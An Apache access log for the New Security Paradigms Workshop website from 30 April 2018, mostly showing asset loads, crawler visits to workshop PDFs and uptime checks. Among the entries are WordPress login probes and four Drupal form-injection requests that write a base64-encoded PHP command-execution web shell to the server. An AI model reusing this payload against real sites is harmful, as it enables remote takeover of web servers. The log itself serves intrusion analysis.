123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1062 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 4090 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 3963 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 8861 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7372 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:24 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/bg-content-right.png HTTP/1.1" 200 3162 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/bg-content.png HTTP/1.1" 200 798 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
123.126.68.119 - - [30/Apr/2018:08:45:25 -0400] "GET /themes/garland/images/bg-content-left.png HTTP/1.1" 200 3232 "https://www.nspw.org/" "Mozilla/5.0 (Linux; Android 4.0; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/59.0.3071.92"
184.151.179.190 - - [30/Apr/2018:08:46:07 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
184.151.179.190 - - [30/Apr/2018:08:46:08 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [30/Apr/2018:08:47:43 -0400] "GET /papers/2005/nspw2005-taylor-pos.pdf HTTP/1.1" 200 464271 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.248.237.201 - - [30/Apr/2018:08:49:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
115.248.237.201 - - [30/Apr/2018:08:49:01 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:08:50:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [30/Apr/2018:08:51:22 -0400] "GET /papers/2011/nspw2011-bicakci.pdf HTTP/1.1" 200 493614 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:08:51:50 -0400] "GET /2006/invite/preproc.html HTTP/1.1" 200 1904 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [30/Apr/2018:08:52:17 -0400] "GET /papers/2010/nspw2010-faily.pdf HTTP/1.1" 200 539853 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [30/Apr/2018:08:54:03 -0400] "GET /2008/dates.shtml HTTP/1.1" 200 5158 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
138.37.176.251 - - [30/Apr/2018:08:55:05 -0400] "GET /2013/cfp HTTP/1.1" 200 8616 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D100 Safari/604.1"
138.37.176.251 - - [30/Apr/2018:08:55:05 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
138.37.176.251 - - [30/Apr/2018:08:55:06 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
69.162.124.227 - - [30/Apr/2018:08:55:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:08:56:51 -0400] "GET /papers/1999/nspw1999-schneider.pdf HTTP/1.1" 200 682818 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
120.29.65.207 - - [30/Apr/2018:08:59:21 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
120.29.65.207 - - [30/Apr/2018:08:59:22 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.35.126.59 - - [30/Apr/2018:09:00:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.35.126.59 - - [30/Apr/2018:09:00:02 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:09:00:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [30/Apr/2018:09:01:25 -0400] "GET /papers/2013/nspw2013-rowe.pdf HTTP/1.1" 200 609033 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.119.169.239 - - [30/Apr/2018:09:01:36 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.167.95.168 - - [30/Apr/2018:09:01:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
168.167.95.168 - - [30/Apr/2018:09:01:49 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:09:05:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.87 - - [30/Apr/2018:09:05:57 -0400] "GET /2009/proceedings/1996/nspw1996-nelson.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
59.124.153.166 - - [30/Apr/2018:09:06:02 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6216 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:09:06:03 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6214 "-" "curl/7.47.0"
199.16.157.180 - - [30/Apr/2018:09:07:17 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
5.9.106.81 - - [30/Apr/2018:09:08:23 -0400] "GET /2004/nspw2004program.pdf HTTP/1.1" 200 30975 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 OPR/50.0.2762.67"
78.46.90.120 - - [30/Apr/2018:09:08:23 -0400] "GET /2004/pre-proceedings/36.pdf HTTP/1.1" 404 8076 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
88.198.90.9 - - [30/Apr/2018:09:08:23 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 200 120269 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.58.2 (KHTML, like Gecko) Version/5.1.8 Safari/534.58.2"
188.80.20.148 - - [30/Apr/2018:09:09:05 -0400] "GET /wp-login.php HTTP/1.1" 404 8018 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
188.80.20.148 - - [30/Apr/2018:09:09:08 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.6.58.226 - - [30/Apr/2018:09:09:18 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.6.58.226 - - [30/Apr/2018:09:09:19 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [30/Apr/2018:09:10:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
117.97.219.86 - - [30/Apr/2018:09:10:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
117.97.219.86 - - [30/Apr/2018:09:10:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [30/Apr/2018:09:10:32 -0400] "GET /papers/2009/nspw2009-johnson.pdf HTTP/1.1" 200 458528 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
79.169.210.40 - - [30/Apr/2018:09:10:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
79.169.210.40 - - [30/Apr/2018:09:10:50 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.211.61.50 - - [30/Apr/2018:09:11:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.211.61.50 - - [30/Apr/2018:09:11:57 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [30/Apr/2018:09:15:04 -0400] "GET /papers/2005/nspw2005-schwarting.pdf HTTP/1.1" 200 692999 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:09:15:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.200 - - [30/Apr/2018:09:17:44 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
35.167.190.252 - - [30/Apr/2018:09:18:13 -0400] "-" 408 3490 "-" "-"
35.167.190.252 - - [30/Apr/2018:09:18:13 -0400] "-" 408 3490 "-" "-"
216.244.66.236 - - [30/Apr/2018:09:18:23 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
66.160.140.183 - - [30/Apr/2018:09:18:40 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
199.16.157.180 - - [30/Apr/2018:09:18:54 -0400] "GET /robots.txt HTTP/1.1" 200 5699 "-" "Twitterbot/1.0"
199.16.157.180 - - [30/Apr/2018:09:18:54 -0400] "GET / HTTP/1.1" 200 3158 "-" "Twitterbot/1.0"
66.249.73.87 - - [30/Apr/2018:09:19:32 -0400] "GET /papers/1999/nspw1999-michael.pdf HTTP/1.1" 200 596849 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [30/Apr/2018:09:19:37 -0400] "GET /papers/2010/nspw2010-vancleeff.pdf HTTP/1.1" 200 418639 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:09:20:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
183.83.239.251 - - [30/Apr/2018:09:20:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
183.83.239.251 - - [30/Apr/2018:09:20:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
35.167.190.252 - - [30/Apr/2018:09:20:31 -0400] "GET /proceedings HTTP/1.1" 200 6386 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
106.192.107.147 - - [30/Apr/2018:09:22:24 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [30/Apr/2018:09:22:43 -0400] "GET /2016/organizers HTTP/1.1" 200 7203 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
194.187.170.110 - - [30/Apr/2018:09:22:47 -0400] "GET /robots.txt HTTP/1.1" 200 4822 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
194.187.170.110 - - [30/Apr/2018:09:22:48 -0400] "GET / HTTP/1.1" 200 3460 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
77.88.47.40 - - [30/Apr/2018:09:22:53 -0400] "GET /2009/proceedings/2004/nspw2004-hollebeek.pdf HTTP/1.1" 200 120269 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:09:23:30 -0400] "GET /node/22 HTTP/1.1" 200 6156 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [30/Apr/2018:09:23:54 -0400] "GET /2011/local HTTP/1.1" 200 8302 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [30/Apr/2018:09:24:11 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 4280145 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [30/Apr/2018:09:25:07 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
180.76.15.155 - - [30/Apr/2018:09:25:59 -0400] "GET /proceedings/1994 HTTP/1.1" 200 12193 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
59.124.153.166 - - [30/Apr/2018:09:26:07 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6215 "-" "curl/7.47.0"
59.124.153.166 - - [30/Apr/2018:09:26:08 -0400] "GET /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 200 6212 "-" "curl/7.47.0"
37.187.91.117 - - [30/Apr/2018:09:27:09 -0400] "GET / HTTP/1.1" 200 11449 "-" "Mozilla/5.0 (compatible; Grobbot/2.2; +https://grob.it)"
66.249.73.89 - - [30/Apr/2018:09:28:44 -0400] "GET /node/70 HTTP/1.1" 200 7005 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
115.132.159.49 - - [30/Apr/2018:09:29:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
115.132.159.49 - - [30/Apr/2018:09:29:14 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
70.42.131.170 - - [30/Apr/2018:09:29:52 -0400] "GET / HTTP/1.1" 200 6623 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 2307 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1742 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 662 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 756 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 629 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1219 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1445 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
70.42.131.170 - - [30/Apr/2018:09:29:53 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.2)"
